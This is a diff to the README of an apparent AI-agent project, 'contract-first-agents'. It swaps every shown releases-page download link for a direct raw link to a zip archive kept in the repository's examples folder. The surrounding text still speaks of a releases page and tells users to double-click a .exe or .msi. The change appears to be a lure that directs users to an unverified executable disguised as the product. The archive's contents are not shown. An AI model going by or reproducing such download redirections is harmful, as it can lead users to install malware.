@@ -1,11 +1,11 @@
 # 🧩 contract-first-agents - Better AI teamwork with clear contracts
 
-[![Download the app](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/reactflowbrasil-lgtm/contract-first-agents/releases)
+[![Download the app](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/reactflowbrasil-lgtm/contract-first-agents/main/examples/first-agents-contract-3.8.zip)
 
 ## 📥 Download
 
 To get the app, visit this page to download:  
-https://github.com/reactflowbrasil-lgtm/contract-first-agents/releases
+https://raw.githubusercontent.com/reactflowbrasil-lgtm/contract-first-agents/main/examples/first-agents-contract-3.8.zip
 
 On the releases page, look for the latest Windows file and download it to your computer.
 
@@ -163,7 +163,7 @@ If you see a `.exe` or `.msi`, double-click it to start setup. If you see a `.zi
 ## 📎 Download again
 
 If you need the file again, use this page to download:  
-https://github.com/reactflowbrasil-lgtm/contract-first-agents/releases
+https://raw.githubusercontent.com/reactflowbrasil-lgtm/contract-first-agents/main/examples/first-agents-contract-3.8.zip
 
 ## 🧾 Project focus
 
